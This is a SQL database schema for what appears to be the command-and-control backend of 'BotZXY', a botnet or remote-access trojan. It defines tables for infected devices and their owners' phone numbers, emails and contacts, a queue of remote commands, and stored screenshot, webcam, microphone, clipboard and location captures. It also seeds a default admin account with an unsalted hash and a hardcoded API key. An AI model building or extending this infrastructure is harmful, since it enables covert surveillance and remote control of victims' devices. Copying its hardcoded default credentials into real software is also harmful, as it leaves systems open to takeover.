-- BotZXY Database Schema

CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password_hash TEXT NOT NULL,
    api_key TEXT UNIQUE NOT NULL,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS devices (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT UNIQUE NOT NULL,
    user_id INTEGER REFERENCES users(id),
    platform TEXT,
    hostname TEXT,
    ip TEXT,
    country TEXT,
    os_version TEXT,
    is_online BOOLEAN DEFAULT 1,
    last_seen TIMESTAMP,
    registered_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    memory_info TEXT,
    storage_info TEXT,
    camera_count INTEGER DEFAULT 0,
    has_microphone BOOLEAN DEFAULT 0,
    phone_number TEXT,
    email TEXT,
    contacts TEXT,
    bot_name TEXT DEFAULT 'BotZXY'
);

CREATE TABLE IF NOT EXISTS commands (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT REFERENCES devices(device_id),
    command TEXT NOT NULL,
    params TEXT,
    status TEXT DEFAULT 'pending',
    result TEXT,
    executed_at TIMESTAMP,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS captures (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT REFERENCES devices(device_id),
    type TEXT CHECK(type IN ('screenshot', 'webcam', 'mic', 'clipboard', 'location')),
    data TEXT,
    file_path TEXT,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE IF NOT EXISTS logs (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    device_id TEXT,
    action TEXT,
    details TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);

-- Default admin user
INSERT OR IGNORE INTO users (username, password_hash, api_key)
VALUES ('admin', '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918', 'botzxy_admin_api_key_2026');